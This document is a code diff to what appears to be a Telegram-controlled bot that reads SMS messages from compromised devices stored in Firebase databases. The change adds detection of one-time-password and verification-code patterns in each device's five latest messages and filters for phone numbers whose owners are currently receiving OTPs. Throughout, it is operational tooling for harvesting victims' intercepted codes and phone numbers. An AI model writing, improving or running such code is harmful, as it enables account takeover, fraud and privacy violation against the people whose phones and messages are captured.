@@ -203,6 +203,34 @@ def extract_all_phones(messages_dict):
     matches = re.findall(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
     return list(dict.fromkeys(matches))
 
+def message_has_otp_pattern(msg_val) -> bool:
+    """Checks if a single message entry contains any OTP message/code pattern."""
+    if not isinstance(msg_val, dict):
+        return False
+    body = str(msg_val.get("body") or msg_val.get("message") or msg_val.get("msg") or "")
+    if not body.strip():
+        return False
+
+    # Explicit OTP / verification wording + digits, or any 4-8 digit standalone code
+    has_keyword = bool(re.search(r'\b(?:otp|one[\s-]*time[\s-]*password|verification[\s-]*code|passcode|auth[\s-]*code)\b', body, re.IGNORECASE))
+    codes = re.findall(r'\b\d{4,8}\b', body)
+    filtered_codes = [c for c in codes if c not in {"0000", "1234", "000000", "123456", "111111", "999999", "00000000"}]
+
+    if has_keyword and filtered_codes:
+        return True
+    if len(filtered_codes) >= 1 and re.search(r'\b(?:code|pin|otp|valid|verify|verification)\b', body, re.IGNORECASE):
+        return True
+    if any(len(c) == 6 for c in filtered_codes):
+        return True
+    return False
+
+def top5_has_otp_pattern(msgs) -> bool:
+    """Returns True if at least 1 of the top 5 most recent messages has an OTP pattern."""
+    if not isinstance(msgs, dict) or not msgs:
+        return False
+    top5_items = list(msgs.items())[-5:]
+    return any(message_has_otp_pattern(m_val) for _, m_val in top5_items)
+
 PUSH_CHARS = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"
 
 def decode_firebase_push_id(push_id: str):
@@ -975,7 +1003,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Targeting all unregistered numbers across online devices...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>OTP-Active Scan Started!</b> Filtering unregistered numbers with >=1 OTP pattern in top 5 SMS...", parse_mode="HTML", reply_markup=get_main_menu())
 
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -985,6 +1013,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         registered_numbers = []
         skipped_phones = set()
         used_phones = set()
+        skipped_cids = set()
         logger = LiveLogger(status_msg)
 
         try:
@@ -1000,27 +1029,40 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 clients_data = await r.json() or {}
 
                             for cid, cdata in clients_data.items():
+                                if cid in skipped_cids:
+                                    continue
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     try:
-                                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=5) as m_req:
+                                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=5', timeout=5) as m_req:
                                             msgs = await m_req.json()
-                                            phones = extract_all_phones(msgs)
-                                            for phone in phones:
-                                                full_phone = "+91" + phone
-                                                if full_phone not in skipped_phones and full_phone not in used_phones:
-                                                    all_unregistered_candidates.append({
-                                                        "firebase_url": fb_url,
-                                                        "db_short_id": db_short_id,
-                                                        "cid": cid,
-                                                        "phone": full_phone
-                                                    })
+
+                                        # Require at least 1 OTP pattern in the top 5 most recent messages
+                                        if not top5_has_otp_pattern(msgs):
+                                            skipped_cids.add(cid)
+                                            continue
+
+                                        phones = extract_all_phones(msgs)
+                                        if not phones:
+                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=5) as p_req:
+                                                p_msgs = await p_req.json()
+                                                phones = extract_all_phones(p_msgs)
+
+                                        for phone in phones:
+                                            full_phone = "+91" + phone
+                                            if full_phone not in skipped_phones and full_phone not in used_phones:
+                                                all_unregistered_candidates.append({
+                                                    "firebase_url": fb_url,
+                                                    "db_short_id": db_short_id,
+                                                    "cid": cid,
+                                                    "phone": full_phone
+                                                })
                                     except Exception:
                                         pass
                         except Exception:
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No online unregistered numbers found. Retrying in 5s...")
+                    await logger.set_text("🔴 Scan complete: No online unregistered devices with >=1 OTP pattern in top 5 SMS. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
